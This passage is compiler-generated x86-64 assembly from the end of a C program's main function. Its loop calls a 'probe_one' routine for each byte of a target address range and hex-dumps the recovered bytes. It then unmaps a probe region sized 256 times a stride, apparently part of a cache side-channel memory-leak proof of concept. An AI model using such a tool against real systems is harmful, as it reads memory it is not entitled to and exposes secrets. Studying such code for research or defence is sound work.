	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L47
.L37:
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -240(%rbp)
	jmp	.L38
.L41:
	cmpl	$0, -248(%rbp)
	jne	.L39
	cmpq	$0, -240(%rbp)
	je	.L39
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L39
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	addq	%rdx, %rax
	subq	$16, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movl	$16, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L39:
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rbx
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	probe_one
	movb	%al, -48(%rbp,%rbx)
	cmpl	$0, -248(%rbp)
	je	.L40
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	leaq	-48(%rbp), %rax
	addq	%rdx, %rax
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	write@PLT
.L40:
	addq	$1, -240(%rbp)
.L38:
	movq	-240(%rbp), %rax
	cmpq	-224(%rbp), %rax
	jb	.L41
	cmpl	$0, -248(%rbp)
	jne	.L42
	cmpq	$0, -240(%rbp)
	je	.L42
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	je	.L43
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	jmp	.L44
.L43:
	movl	$16, %edx
.L44:
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L45
	movq	-240(%rbp), %rax
	subq	$1, %rax
	andq	$-16, %rax
	jmp	.L46
.L45:
	movq	-240(%rbp), %rax
	andq	$-16, %rax
.L46:
	movq	-232(%rbp), %rcx
	addq	%rcx, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L42:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	movslq	%eax, %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	munmap@PLT
	movl	$0, %eax
.L47:
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L48
	call	__stack_chk_fail@PLT
.L48:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

